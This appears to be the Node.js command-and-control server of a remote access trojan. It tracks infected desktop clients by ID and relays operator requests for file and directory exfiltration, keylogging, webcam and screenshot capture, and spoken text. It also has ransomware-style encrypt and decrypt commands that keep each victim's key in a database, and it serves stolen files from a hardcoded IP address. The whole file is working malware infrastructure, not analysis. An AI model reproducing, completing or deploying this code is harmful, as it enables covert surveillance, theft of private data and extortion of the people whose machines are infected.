module.exports.socketIOinit = socketIOinit;
module.exports.sendRequestToDesktop = sendRequestToDesktop;
module.exports.requestFilesFromClient = requestFilesFromClient;

var db = require('./db');
var socketListeners = {};
var clientListeners = {};
var fileHandler = require('./filehandler');
//example: testmac: [socketobj1, socketobj2],

function socketIOinit(io)
{
  console.log("running on port");
  //python client connects
  io.on('connection',function(socket){
    // socketListeners
    // call this immediately on PC client
    socket.on('registerListener',function(data){
      console.log("uid: " + data['UID']);
      var uuid = data['UID'];
      if (!socketListeners[uuid]) {
        socketListeners[uuid] = [];
      }
      socketListeners[uuid].push(socket);
    });

    socket.on('reqFiles',function(data){
      var client = data["client"];
      var dir = data["dir"];
      var file = data["file"];
      console.log("req files");
      requestFilesFromClient(file, dir, client, socket);
    });

    socket.on("reqEncrypt",function(data){
      var client = data["client"];
      console.log("req encrypt");
      encrypt(client);
    });

    socket.on("reqDecrypt",function(data){
      var client = data["client"];
      console.log("req decrypt");
      decrypt(client);
    });

    socket.on("reqKeylog",function(data){
      var client = data["client"];
      console.log("req keylog");
      keylog(client,socket);
    });

    socket.on("reqWebcam",function(data){
      var client = data["client"];
      console.log("req webcam");
      webcam(client,socket);
    });

    socket.on("reqScreenshot",function(data){
      var client = data["client"];
      console.log("req screenshot");
      screenshot(client,socket);
    });

    socket.on("reqTTS",function(data){
      var client = data["client"];
      var text = data["text"];
      console.log("req tts");
      tts(client,text);
    });

  });
}

function requestFilesFromClient(file, dir, uuid, clientSocket) {
  if(socketListeners[uuid]) {
    socketListeners[uuid].forEach(function(socket) {
      var path = dir + file;
      socket.emit("fileReq", {"dir":dir, "file":file});
      socket.removeAllListeners('fileData');
      socket.removeAllListeners('dirData');
      socket.on('fileData',function(data){
        var base64data = data["filedata"];
        var filename = data["file"];
        console.log("file: " + filename);
        var decodedData = fileHandler.decodeBase64(base64data);
        fileHandler.writeDataToUserClientFile(uuid, filename, decodedData);
        console.log("about to call clientSocket");
        clientSocket.emit("fileReady",{"url":"http://159.203.126.117:6969/getFile/" + uuid + "/" + filename});
      });
      socket.on('dirData',function(data){
        var dirData = data["syslist"];
        console.log(dirData);
        console.log("about to call dirReady");
        clientSocket.emit("dirReady",{"syslist":dirData});
      });
    });
  }
}

function keylog(uuid,clientSocket) {
  if(socketListeners[uuid]) {
    socketListeners[uuid].forEach(function(socket) {
      socket.emit('keylog',{});
      socket.on('keylogData',function(data) {
        //var base64data = data["filedata"];
        //var decodedData = fileHandler.decodeBase64(base64data);
        console.log(data);
        console.log(data["keylogdata"]);
        clientSocket.emit("keylogReady",{"text":data["keylogdata"]});
      });
    });
  }
}

function encrypt(uuid) {
  if(socketListeners[uuid]) {
    socketListeners[uuid].forEach(function(socket) {
      socket.emit('encrypt',{});
      socket.on('encryptData',function(data) {
        var key = data["key"];
        console.log("key: " + key);
        db.replace("encryptions",{encryptionKey: key, token: uuid},function(){
          //success
          console.log("encryption key successfully stored");
        },function(){
          //fail
        });
      });
    });
  }
}

function decrypt(uuid) {
  if(socketListeners[uuid]) {
    socketListeners[uuid].forEach(function(socket) {
      db.where('encryptions','token',uuid,function(rows){
        if(rows != null) {
          socket.emit("decrypt",{"key":rows[rows.length - 1].encryptionKey});
        }
      })
    });
  }
}

function webcam(uuid,clientSocket) {
  if(socketListeners[uuid]) {
    socketListeners[uuid].forEach(function(socket) {
      socket.emit('webcam',{});
      socket.on('webcamData',function(data) {
        var base64data = data["filedata"];
        clientSocket.emit("captureReady",{"imgdata":base64data});
      });
    });
  }
}

function screenshot(uuid,clientSocket) {
  if(socketListeners[uuid]) {
    socketListeners[uuid].forEach(function(socket) {
      socket.emit('screenshot',{});
      socket.on('screenshotData',function(data) {
        var base64data = data["filedata"];
        clientSocket.emit("captureReady",{"imgdata":base64data});
      });
    });
  }
}

function tts(uuid,text) {
  if(socketListeners[uuid]) {
    socketListeners[uuid].forEach(function(socket) {
      socket.emit("tts",{"text":text});
    });
  }
}

function sendRequestToDesktop(type, data, uuid) {
  if (socketListeners[uuid]) {
    socketListeners[uuid].forEach(function(socket) {
      socket.emit(type, data);
    });
  }
}
